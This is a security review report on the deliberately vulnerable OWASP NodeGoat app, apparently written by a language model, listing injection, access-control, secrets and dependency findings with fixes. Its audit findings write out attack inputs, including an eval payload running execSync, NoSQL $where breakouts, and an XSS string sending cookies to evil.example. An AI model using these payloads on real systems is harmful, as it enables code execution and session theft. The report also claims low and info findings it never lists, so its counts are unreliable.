# NodeGoat — Code Safety Report

## Résumé exécutif

Cette revue porte sur NodeGoat (OWASP), une application Node.js/Express/MongoDB délibérément vulnérable, à la racine `/root/targets/NodeGoat` verrouillée par `target.json` (111 fichiers, SHA-256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`). Six départements ont mené leur propre revue sur des branches distinctes — accès et sessions, exposition des données et cryptographie, dépendances, injection, configuration de la plateforme, et secrets codés en dur — puis leurs 62 constats ont été fusionnés et dédupliqués par fichier, ligne et CWE, en retenant l'entrée de plus haute confiance à chaque doublon, pour produire les 57 constats de `findings.json` : 7 critiques, 16 élevés, 17 moyens, 16 faibles et 1 informatif. Les plus importants : (1) trois injections de code côté serveur critiques via `eval()` sur les champs de cotisation de retraite (`app/routes/contributions.js:32-34`), permettant l'exécution de code arbitraire par tout utilisateur authentifié ; (2) l'absence de contrôle de rôle administrateur sur `GET /benefits` (`app/routes/index.js:55`), qui renvoie le mot de passe en clair de chaque utilisateur à quiconque est connecté ; (3) le secret de signature des cookies de session codé en dur et committé (`config/env/all.js:8`), qui permet de forger une session pour n'importe quel utilisateur, combiné à un mot de passe administrateur également codé en dur dans le script d'amorçage de la base (`artifacts/db-reset.js:18`).

La revue a couvert les points d'entrée HTTP (`app/routes/*.js`), les accesseurs de données MongoDB (`app/data/*.js`), les vues Swig rendues par ces routes, `server.js` et l'arborescence `config/`, ainsi que le manifeste et le verrou de dépendances (`package.json`, `package-lock.json`) via `npm audit`. Elle n'a pas couvert l'historique Git, l'infrastructure de déploiement réelle, les tests dynamiques (DAST), ni les actifs vendored/binaires ; voir « Ce qui n'a pas été couvert » pour la liste complète, y compris les cinq constats fusionnés (doublons de fichier/ligne/CWE) et retirés de `findings.json` à ce titre. Méthode : lecture des points d'entrée avant tout, données tracées de la source au point d'exécution, un constat par point d'exécution, ligne citée exactement (vérifiée mécaniquement par `verify-safety-report.mjs`) et niveau de confiance déclaré pour chaque constat ; semgrep (règles locales du programme plus, pour cinq des six départements, le paquet `p/owasp-top-ten`, indisponible sur le réseau lors de l'exécution du département données) a orienté la lecture sans jamais servir de preuve à lui seul.

## Executive summary

This review covers NodeGoat (OWASP), a deliberately vulnerable Node.js/Express/MongoDB application, rooted at `/root/targets/NodeGoat` and locked by `target.json` (111 files, SHA-256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`). Six departments each ran their own review on separate branches — access and sessions, data exposure and cryptography, dependencies, injection, platform configuration, and hard-coded secrets — and their 62 findings were merged and deduplicated by file, line and CWE (keeping the higher-confidence entry at each duplicate) into the 57 findings in `findings.json`: 7 critical, 16 high, 17 medium, 16 low, 1 info. The most important: (1) three critical server-side code-injection sinks via `eval()` on the retirement-contribution fields (`app/routes/contributions.js:32-34`), letting any authenticated user run arbitrary code on the server; (2) a missing admin-role check on `GET /benefits` (`app/routes/index.js:55`), which returns every user's plaintext password to any logged-in user; (3) a hard-coded, committed session-signing secret (`config/env/all.js:8`) that lets anyone forge a session for any user, compounded by a hard-coded admin password in the database seed script (`artifacts/db-reset.js:18`).

The review covered the HTTP entry points (`app/routes/*.js`), the MongoDB data-access layer (`app/data/*.js`), the Swig views those routes render, `server.js`, the `config/` tree, and the dependency manifest and lockfile (`package.json`, `package-lock.json`) via `npm audit`. It did not cover git history, the actual deployed infrastructure, dynamic (DAST) testing, or vendored/binary assets; see "What was not covered" for the full list, including the five findings merged away as file/line/CWE duplicates and dropped from `findings.json` on that basis. Method: entry points read first, data traced from source to sink, one finding per sink, the exact line quoted (mechanically re-verified by `verify-safety-report.mjs`), and a stated confidence level per finding; semgrep (this program's local rules plus, for five of the six departments, the `p/owasp-top-ten` registry pack — unreachable on the network during the data department's run) directed the reading but was never treated as evidence on its own.

## Scope and method

Target: `/root/targets/NodeGoat` (OWASP NodeGoat), locked by `target.json` at 111 files, SHA-256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`; read-only for every department and for this integration.

Six departments ran, each on its own branch, and each delivered `findings/<department>.json` plus `report/<department>.md`:

- **access** — authentication, session handling, authorization/IDOR, CSRF. Read `app/routes/*.js`, `app/routes/session.js`, `app/data/user-dao.js`, `app/data/benefits-dao.js`, `server.js`, and `config/config.js`/`config/env/*.js` in full.
- **data** — sensitive-data exposure, logging, cryptography. Read `server.js`, `app/routes/*` and `app/data/*` (the DAOs), `config/`, the error-handling view, and `artifacts/db-reset.js`.
- **dependencies** — manifest/lockfile risk. Read `package.json` in full (16 production and 21 dev dependencies) and ran `npm audit --json` against `package-lock.json`, plus `npm view` for packages with no open advisory.
- **injection** — SQL/NoSQL/command/code injection, XSS, SSRF, open redirect. Read `app/routes/*`, `app/data/*`, and the Swig views those routes render.
- **platform** — security headers, CORS, cookies, error handling, rate limiting, debug settings. Read `server.js` end to end, `app/routes/error.js` and its template, `config/`, `docker-compose.yml`.
- **secrets** — credential and key patterns. Read every file under `config/`, `server.js`, `artifacts/` (including the committed `server.key`), `docker-compose.yml`, `Dockerfile`, `app.json`, `Procfile`, `package.json`, the CI workflow files, the test fixtures, and grepped for secret-shaped assignments and PEM key blocks.

Tools that ran: **semgrep 1.177.0**, invoked as `semgrep --config <this program's local rule pack> --config p/owasp-top-ten --metrics off --json` against the full target tree. The `p/owasp-top-ten` registry pack loaded and ran for five of the six departments (access, dependencies, injection, platform, secrets — each reporting roughly 29 hits over 72 git-tracked files with 113 rules); it was unreachable when the data department ran, which used this program's local rules only, per that department's documented fallback. Every semgrep hit across all six runs was used only to direct reading, never accepted as a finding by itself — each finding below was independently confirmed by reading the cited source-to-sink path in the target tree. The dependencies department additionally ran **`npm audit --json`** against the committed `package-lock.json` (no `node_modules` was installed or created; the target directory was confirmed unchanged by `git status` afterward) and **`npm view <pkg> version|deprecated|time`** for packages `npm audit` reported no advisory against, to check for abandonment.

This is a review by a language model, grounded by the semgrep static scanner and by the committed mechanical examiner, `verify-safety-report.mjs`, which re-hashes every locked file in the target tree and re-verifies every finding's `file`, `line`, and `snippet` against that tree before any finding is accepted.

## Findings

### critical

- `injection-eval-pretax` — Server-side code injection via eval() of the preTax contribution field (`app/routes/contributions.js:32`, CWE-95, confirmed) — Any authenticated user can submit a POST /contributions request with preTax set to arbitrary JavaScript (e.g. "require('child_process').execSync('id')") which runs with the full privileges of the Node.js server process, yielding remote code execution. Replace eval(req.body.preTax) with Number(req.body.preTax) or parseInt(req.body.preTax, 10) and reject non-numeric input before use.
- `injection-eval-aftertax` — Server-side code injection via eval() of the afterTax contribution field (`app/routes/contributions.js:33`, CWE-95, confirmed) — Any authenticated user can submit POST /contributions with afterTax set to arbitrary JavaScript, achieving remote code execution in the server process. Replace eval(req.body.afterTax) with Number(req.body.afterTax) or parseInt(req.body.afterTax, 10) and reject non-numeric input before use.
- `injection-eval-roth` — Server-side code injection via eval() of the roth contribution field (`app/routes/contributions.js:34`, CWE-95, confirmed) — Any authenticated user can submit POST /contributions with roth set to arbitrary JavaScript, achieving remote code execution in the server process. Replace eval(req.body.roth) with Number(req.body.roth) or parseInt(req.body.roth, 10) and reject non-numeric input before use.
- `access-missing-role-benefits-view` — GET /benefits discloses every user's record, including plaintext passwords, with no admin-role check (`app/routes/index.js:55`, CWE-862, confirmed) — Any authenticated user, including one who just self-registered via /signup, can GET /benefits and receive every non-admin user's stored document -- name, email and plaintext password -- letting them log in as any other user in the system. Add the isAdmin middleware to this route, and stop returning the password field from getAllNonAdminUsers / the benefits view regardless.
- `secrets-db-seed-admin-password` — Database seed script hard-codes a plaintext admin password that the app compares directly at login (`artifacts/db-reset.js:18`, CWE-798, confirmed) — Anyone who deploys NodeGoat via the documented docker-compose or Heroku path — or anyone who simply knows this public repository — can log in as the admin user with userName "admin" / password "Admin_123" and reach every admin-only function the app exposes. Never seed a real deployment with a fixed credential; generate a random admin password at first boot (or require an operator-supplied one via environment variable/secret store), hash it with bcrypt before storing (the code to do so already exists commented out in this file and in app/data/user-dao.js), and force a password change on first login.
- `access-hardcoded-session-secret` — Session-signing secret is a hardcoded literal committed to the repository (`config/env/all.js:8`, CWE-798, confirmed) — Anyone with the source (this is a public repository) can compute a valid signature for any session id, including one carrying an arbitrary userId, and present it as a cookie to authenticate as any user -- including an admin -- without credentials. Read the secret from an environment variable / secret manager, generate it randomly per deployment, and rotate the committed value.
- `dependencies-underscore` — underscore 1.9.1 is within the range vulnerable to CVE-2021-23358 (arbitrary code execution via template()) (`package.json:23`, CWE-94, confirmed) — GHSA-cf4h-3jhx-xvhq lets an attacker who controls a value passed into underscore's `template()` function execute arbitrary JavaScript on the server; whether this app reaches that function with attacker-controlled input was not traced as part of this dependency-only review, so treat this as a confirmed vulnerable dependency with impact conditional on a call-site the code-review departments should check. Upgrade underscore to >=1.12.1 at minimum (fixes the code-execution advisory) and ideally to the current 1.13.8.

### high

- `injection-nosql-where-allocations` — NoSQL injection in allocations lookup via unsanitized $where threshold (`app/data/allocations-dao.js:78`, CWE-943, confirmed) — Any logged-in user can break out of the single-quoted string in the $where clause (e.g. threshold="0'; while(true){}; var x='" or "0'; return true; var x='") to run arbitrary JavaScript inside the MongoDB server for every document scanned, enabling data exfiltration across users or denial of service. Drop $where entirely and use a native query operator, e.g. { userId: parsedUserId, stocks: { $gt: parseInt(threshold, 10) } }, after validating threshold is a bounded integer.
- `data-002-cleartext-ssn-bank-storage` — SSN, date of birth, and bank account/routing numbers are stored unencrypted (`app/data/profile-dao.js:61`, CWE-312, confirmed) — Anyone with read access to the `users` collection - a DB backup, an admin, or an attacker who reaches the database through another flaw - obtains every user's social security number, date of birth, bank account number and routing number in plaintext, enabling identity theft and financial fraud. Encrypt ssn, dob, bankAcc and bankRouting at rest with an authenticated cipher (AES-GCM) using a per-record random IV and a key from a KMS/secrets manager, or use MongoDB field-level/client-side encryption; decrypt only when displaying to the owning user.
- `data-001-plaintext-password-storage` — User passwords are stored in the database as plaintext (`app/data/user-dao.js:25`, CWE-256, confirmed) — Anyone who can read the `users` collection - via a database backup, a NoSQL-injection foothold (the app already builds unsanitized $where queries in app/data/allocations-dao.js), or an insider with DB access - recovers every user's real login password in plaintext, including the admin account, enabling immediate account takeover and credential-stuffing against other services where the same password is reused. Hash passwords with bcrypt (or argon2id) before insert: `password: bcrypt.hashSync(password, bcrypt.genSaltSync(12))`, and compare with `bcrypt.compareSync(password, user.password)` in validateLogin instead of `===`.
- `access-no-ratelimit-login` — Login endpoint has no rate limiting or lockout in its middleware chain (`app/routes/index.js:34`, CWE-307, confirmed) — An attacker can submit unlimited login attempts against any username with no delay, lockout or CAPTCHA, making online credential stuffing and password guessing practical against every account. Add a per-account (not just per-IP) rate limiter or progressive lockout in front of handleLoginRequest, e.g. express-rate-limit or express-brute keyed on the submitted userName.
- `access-missing-role-benefits-update` — POST /benefits changes any user's benefit date with no admin-role check (`app/routes/index.js:56`, CWE-862, confirmed) — Any authenticated non-admin user can POST an arbitrary userId and benefitStartDate to change any other employee's benefits record; the feature is admin-only by design (see the commented-out isAdmin fix) but enforced nowhere at runtime. Add the existing isAdmin middleware to this route: app.post("/benefits", isLoggedIn, isAdmin, benefitsHandler.updateBenefits).
- `access-idor-allocations` — Allocations route trusts a user id taken from the URL instead of the session (`app/routes/index.js:63`, CWE-639, confirmed) — Any logged-in user can enumerate and read every other user's financial allocation data by walking the :userId path parameter; no ownership check exists anywhere on this route. Take the id from req.session.userId (as the commented-out code already shows) instead of req.params.userId, or verify req.params.userId === req.session.userId before querying.
- `injection-ssrf-research` — Server-side request forgery in research lookup builds the fetch URL from query parameters (`app/routes/research.js:15`, CWE-918, confirmed) — Any authenticated user can make the server issue requests to arbitrary hosts, including internal-only services, cloud metadata endpoints (e.g. 169.254.169.254), or localhost-bound admin interfaces, and the response body is echoed back verbatim in res.write(body) at line 25, turning the SSRF into a proxy for reading internal service responses. Validate req.query.url against an allowlist of permitted external hosts/schemes before issuing the request, or route the lookup through a fixed, server-controlled base URL plus a validated symbol parameter instead of a fully attacker-supplied URL.
- `data-004-secrets-logged-at-startup` — The session cookie secret and crypto key are printed to the console on every application start (`config/config.js:12`, CWE-532, confirmed) — Anyone with access to the process's stdout - container logs, a log aggregator (this app ships a Procfile for Heroku-style deployment), or a CI build log - obtains `cookieSecret`, letting them forge a valid express-session cookie for any user including the admin, and `cryptoKey`, the key intended for encrypting sensitive fields. Remove the unconditional config dump, or redact secret-shaped keys (cookieSecret, cryptoKey) before logging, e.g. log an allowlist of non-secret fields only.
- `dependencies-body-parser` — body-parser 1.18.3 is vulnerable to two denial-of-service advisories and pulls a vulnerable qs (`package.json:9`, CWE-400, confirmed) — An attacker can send a crafted request body that exhausts server resources before any route handler validation runs, taking the application down for all users. Upgrade body-parser to >=1.20.6 (npm audit reports a fix is available without a major bump); this also pulls a patched qs.
- `dependencies-express` — Express 4.16.4 carries an open-redirect advisory, a reflected-XSS advisory, and 6 further transitive advisories (`package.json:13`, CWE-601, confirmed) — A malformed URL reaching res.redirect() (or a raw path-to-regexp route) can send a victim to an attacker-controlled destination or reflect script back into the response; the transitive chain adds a further set of DoS and template-injection vectors on the same request path. Upgrade express past 4.21.2 (or to the current 5.x line); npm audit reports a fix is available in this repository's lockfile constraints.
- `dependencies-marked` — marked 0.3.5 has six known advisories including two sanitization-bypass/XSS issues and two ReDoS issues (`package.json:17`, CWE-79, confirmed) — Markdown containing a crafted data URI or entity sequence can bypass marked's own sanitization and render as executable script in a victim's browser, and several of the same inputs can hang the renderer via catastrophic backtracking. Upgrade marked to at least 0.3.19 for the pre-4.x advisories, or to the current major, and re-verify any output is still passed through the app's own HTML sanitization before being written to the page.
- `dependencies-mongodb` — mongodb driver 2.2.36 has a direct DoS advisory and a critical deserialization advisory in its bundled bson (`package.json:18`, CWE-502, confirmed) — A crafted document or query response reaching the vulnerable bson deserializer can crash the process or, per the advisory's classification, lead to unsafe deserialization; the current driver is over 40 minor releases and two major versions behind the maintained 7.x line, which has dropped this bson path entirely. Upgrade the mongodb driver (npm audit's suggested fix is the current major, 7.6.0); this is a breaking change to the driver API and will require touching every DAO file, so plan it as a scoped migration rather than a patch bump.
- `dependencies-swig` — swig 1.4.2 has an unpatched arbitrary local file read advisory and is marked no-longer-maintained (`package.json:22`, CWE-22, confirmed) — The unpatched file-read advisory means a template-rendering path that includes attacker-influenced input could be used to read arbitrary files on the server, and there is no version of swig this app could upgrade to that fixes it. Migrate off swig entirely (it is archived); consolidate, which this app also depends on, supports several actively maintained template engines (e.g. EJS, Nunjucks) as drop-in replacements.
- `platform-csrf-disabled` — CSRF protection is fully commented out even though templates already expect a token (`server.js:7`, CWE-352, confirmed) — A page on any other origin can submit a cross-site form to these POST routes; a logged-in victim's browser will attach the session cookie automatically, letting an attacker change the victim's profile, contributions, benefits allocation or post memos on their behalf. Uncomment csurf() and the res.locals.csrftoken assignment, mount it before the routes, and confirm every render() call that serves a form passes csrftoken.
- `platform-template-autoescape-disabled-xss` — Swig template auto-escaping is disabled, so reflected user input renders unescaped (`server.js:137`, CWE-79, confirmed) — Reflected cross-site scripting on the login form (and any other template rendering user-influenced data) lets an attacker run arbitrary JavaScript in the victim's session, including stealing the (non-secure, non-sameSite) session cookie. Remove autoescape: false (restore swig's default of true) and re-verify templates that relied on raw HTML output use an explicit |safe filter only where content is trusted.
- `data-003-cleartext-http-transport` — The entire application is served over plain HTTP, with TLS support present but disabled (`server.js:145`, CWE-319, confirmed) — Any attacker positioned on the network path between the client and the server (shared Wi-Fi, a compromised router, an ISP) can read or modify login credentials, session cookies, and the SSN/bank data submitted through the profile form in transit, with no active interaction from the victim beyond normal use of the site. Uncomment the HTTPS block (lines 18-28, 149-155), serve exclusively over `https.createServer`, redirect any HTTP request to HTTPS, and set `cookie: { secure: true }` on the session middleware.

### medium

- `platform-error-handler-exposes-error-object` — Global error handler renders the raw Error object into the response (`app/routes/error.js:10`, CWE-209, confirmed) — Internal error messages (which for a MongoDB-backed app can include driver/library detail) are exposed to end users, aiding attackers in fingerprinting the stack and crafting further attacks; combined with the disabled autoescape, an error message containing markup would also execute as HTML/JS. Render a generic message plus a correlation id to the client, and keep the full error (message and stack) only in the server-side log.
- `access-csrf-profile-update` — State-changing profile update has no CSRF token anywhere in its chain (`app/routes/index.js:48`, CWE-352, confirmed) — A page on another origin can auto-submit a form to POST /profile using the victim's browser-held session cookie and change their bank account/routing number and SSN on file, since nothing but the cookie is required. Uncomment and mount csurf() before the routes in server.js, and render req.csrfToken() into the profile form so handleProfileUpdate can verify it.
- `injection-open-redirect-learn` — Open redirect on /learn takes the target URL from the query string unchecked (`app/routes/index.js:72`, CWE-601, confirmed) — An attacker can craft a link to https://<app-host>/learn?url=https://evil.example that the target trusts because it originates from the legitimate domain, enabling phishing or OAuth token theft. Validate the target against an allowlist of known-safe relative paths (or a same-origin check) before calling res.redirect(), and reject or default otherwise.
- `access-session-fixation-login` — Login does not regenerate the session id after authenticating (`app/routes/session.js:116`, CWE-384, confirmed) — An attacker who fixes a victim's pre-login session id (e.g. by getting them to open a link that sets the session cookie) inherits an authenticated session once the victim logs in, without needing to know the victim's credentials. Wrap the post-login state change in req.session.regenerate(), the same way handleSignup already does at app/routes/session.js:234.
- `data-006-verbose-error-to-client` — Unhandled exceptions render the raw error object to the client, unescaped (`app/views/error-template.html:11`, CWE-209, confirmed) — An attacker who triggers any unhandled error (a malformed request, a duplicate-key conflict, a downstream driver error) receives internal implementation detail in the response - and, because it is rendered unescaped, any error message built from attacker input becomes a reflected-XSS vector on top of the information disclosure. Render a generic, static error page to the client and keep the detailed message only in the server-side console.error/console.error(err.stack) calls already present at app/routes/error.js:7-8.
- `injection-xss-memos-marked` — Stored XSS risk in memos: markdown-rendered user content is output with template autoescaping disabled (`app/views/memos.html:31`, CWE-79, likely) — If marked's sanitize option does not neutralize a given payload (e.g. a markdown link with a javascript: href), any user's memo text becomes stored HTML/script rendered to every user who views the shared memo list, enabling session hijacking or defacement for all viewers. Re-enable swig autoescape globally, and additionally run the marked() output through a maintained HTML sanitizer (e.g. DOMPurify server-side or sanitize-html) rather than relying solely on marked's built-in sanitize flag, which is deprecated upstream.
- `injection-xss-profile-lastname` — Reflected XSS in profile update error page via unescaped lastName (and sibling fields) (`app/views/profile.html:45`, CWE-79, confirmed) — An attacker who submits a crafted lastName such as "\"><script>document.location='//evil.example/c?'+document.cookie</script>" together with an invalid bankRouting value gets it reflected unescaped into the response, executing in the victim's session and allowing session-cookie theft (the same unescaped pattern also applies to ssn, dob, address, bankAcc and bankRouting on the surrounding lines). Re-enable swig's default autoescape (remove the autoescape: false override in server.js) and/or explicitly HTML-escape user-supplied values before interpolating them into attribute contexts.
- `secrets-committed-rsa-private-key` — A real RSA private key is committed to the repository under artifacts/cert/server.key (`artifacts/cert/server.key:1`, CWE-321, likely) — Anyone with a clone of this repository holds the private key matching artifacts/cert/server.crt. If an operator follows the code's own commented-out instructions to enable HTTPS with this shipped key pair (a plausible path since the files are provided together for that purpose), any client traffic to that HTTPS listener can be decrypted or man-in-the-middled by anyone who has ever cloned the repo. Remove the committed private key from the repository and its history, generate TLS keys per deployment (or via a certificate manager / Let's Encrypt) outside version control, and if this key/cert pair was ever used for a real deployment, revoke and reissue it.
- `data-005-plaintext-passwords-logged-seed` — The database seed script logs every seeded user record, including its plaintext password, to the console (`artifacts/db-reset.js:99`, CWE-532, confirmed) — Anyone with access to the container/build logs recovers valid plaintext credentials for the admin account (`admin` / `Admin_123`) and the two seeded user accounts, sufficient to log in directly. Do not log the full user object; log only the userName, or drop the log line entirely once the seed is verified to have inserted the expected number of documents.
- `secrets-config-logged-to-stdout` — Full application config, including the session secret, is written to stdout on every startup (`config/config.js:13`, CWE-532, confirmed) — Anyone with read access to the application's stdout/log stream (ops tooling, a misconfigured log aggregator, a shared hosting log file) obtains the session-signing secret and crypto key without needing source access, widening who can exploit the session-forgery issue above. Remove the console.log of the full config object, or redact known-sensitive keys (cookieSecret, cryptoKey) before logging, and never log a secrets object at INFO level in production.
- `dependencies-forever` — forever 2.0.0 pulls a chain (flatiron -> nconf -> optimist -> minimist) with critical prototype-pollution advisories (`package.json:15`, CWE-1321, likely) — If any of the vulnerable parsers in this chain (nconf/optimist/minimist) is reachable from data forever handles at runtime rather than only from local startup configuration, an attacker could pollute Object.prototype and change application behavior; forever is used here to run/restart the server process rather than to handle web requests directly, which likely limits, but does not eliminate, remote reachability. Upgrade forever to 4.0.3 (a major-version fix per npm audit) or replace it with a maintained process manager (pm2, systemd) since forever's own upstream has been mostly dormant.
- `dependencies-helmet` — helmet 2.3.0 is three major versions behind and pulls a ReDoS-flagged debug and a CSP config-override bug (`package.json:16`, CWE-1333, confirmed) — A crafted debug-log input could trigger catastrophic backtracking (DoS) in this dependency of the security-header middleware, and the CSP configuration-override bug could let an attacker weaken the Content-Security-Policy the app believes it is sending. Upgrade helmet to a current major version (helmet no longer bundles helmet-csp or the vulnerable debug/connect chain in its modern releases); npm audit reports a fix is available.
- `dependencies-async` — async 2.6.1 (devDependency) is vulnerable to prototype pollution (`package.json:42`, CWE-1321, confirmed) — If a build or test script feeds external/untrusted JSON through this async version's affected functions, an attacker who controls that input could pollute Object.prototype for the duration of the dev/CI process. Upgrade async to >=2.6.4 (a non-major bump per npm audit / the advisory's fixed range).
- `dependencies-cypress` — cypress 3.3.1 (devDependency) is 13+ major versions behind and carries a very large transitive advisory chain (`package.json:44`, CWE-1104, likely) — cypress is a devDependency (test runner), so this is a supply-chain/CI risk rather than a production-request risk: a compromised transitive package here would run with the privileges of whoever runs `npm test`/CI, not with the privileges of the deployed app. Upgrade cypress to a current major version; this is a large breaking change (test syntax has changed significantly since 3.x) and should be scoped as its own migration.
- `dependencies-grunt` — grunt 1.0.3 (devDependency, and the project's own `npm test`/precommit runner) has three direct advisories (`package.json:45`, CWE-94, confirmed) — A malicious Gruntfile task, plugin, or crafted YAML config processed by this exact grunt/js-yaml combination could achieve code execution in whatever environment runs `npm test` or the precommit hook, including CI runners. Upgrade grunt to >=1.6.1 or later (npm audit reports a fix is available) to close the three direct advisories; the getobject and js-yaml transitive fixes generally come along with a current grunt-cli/grunt-legacy-util pairing.
- `platform-missing-security-headers` — No security-header middleware is mounted; helmet is disabled at the require line (`server.js:10`, CWE-693, confirmed) — Responses are open to clickjacking (no frame-ancestors/X-Frame-Options), MIME-sniffing based content-type confusion, no CSP to contain any XSS that does occur, and the framework fingerprint (X-Powered-By: Express) is exposed to attackers for targeted exploitation. Uncomment and mount helmet() early in the middleware stack (before routes), configure a real Content-Security-Policy, and call app.disable("x-powered-by").
- `platform-cookie-missing-secure-flag` — Session cookie's secure attribute is left commented out, so the cookie is not marked HTTPS-only (`server.js:92`, CWE-614, confirmed) — The session cookie can be intercepted or replayed by anyone on the network path since the browser is never told to withhold it from plaintext connections. Uncomment the cookie block, set secure: true once the app is served over HTTPS, and add sameSite: "lax" or "strict".

## What was not covered

- **Git history.** Only the working tree at the locked commit was read; no department ran a full-history secret scan (e.g. gitleaks/trufflehog), so a secret rotated out of `HEAD` but still present in an earlier commit would not have been found (secrets department, explicit).
- **`node_modules` / installed dependency source.** Not part of the locked tree and never installed by any department. Every dependency-version and behavior claim rests on `package-lock.json`'s resolved version plus the npm/OSV advisory database, not a source read of the installed code. This also means no department traced whether a vulnerable library function is actually reachable with attacker-controlled input from this application — `dependencies-underscore` (CVE-2021-23358 in `template()`) and `dependencies-swig` (arbitrary file read) are reported as vulnerable-dependency findings with that reachability explicitly left open for the code-owning departments.
- **Dynamic/DAST testing.** No department started the application, submitted live HTTP requests, or inspected actual runtime responses or log output; every finding here is from static reading of the committed source.
- **Deployed/runtime configuration.** The real `NODE_ENV`, environment variables, MongoDB's own access controls and encryption-at-rest, and any reverse proxy, WAF, or TLS termination in front of a real deployment were not observed and are not assumed either way. Several findings (`access-session-cookie-insecure`, `platform-node-env-defaults-to-development`, `dependencies-forever`, `dependencies-cypress`, `dependencies-mocha`, `dependencies-zaproxy`) are marked `likely` rather than `confirmed` for exactly this reason.
- **Vendored/binary and minified client-side assets** (`app/assets/vendor/*` — jQuery, Bootstrap, Raphael, html5shiv, fonts, images) were not opened; the injection department noted that any `innerHTML`/`document.write` usage inside them is internal library code, not driven by this application's request data.
- **CI/CD supply-chain hardening.** Mutable GitHub Actions tags in `.github/workflows/e2e-test.yml` and `lint.yml` were surfaced by semgrep and read far enough to confirm they carry no additional application vulnerability, but no department's remit covers pipeline-configuration hardening as a finding class, so none was filed.
- **Docker/compose configuration** beyond what feeds directly into an application finding (`docker-compose.yml` running `artifacts/db-reset.js` on every start, `NODE_ENV` not being pinned there). Container privilege level, base-image provenance, and `Dockerfile` build-stage hygiene were not reviewed by any department.
- **Business-logic and concurrency classes of defect** (e.g. contribution-limit or allocation-threshold logic beyond the `eval()` sink itself, race conditions under concurrent requests) — no department's remit covers general business-logic correctness or concurrency bugs, only the injection/access/data/platform/dependency/secrets classes named above.

- **File uploads and source maps.** NodeGoat has no upload endpoint and ships hand-written assets rather than a bundler build, so the platform department found no surface for CWE-434 or production source-map exposure; this was not independently re-verified beyond that department's route-table and asset read.
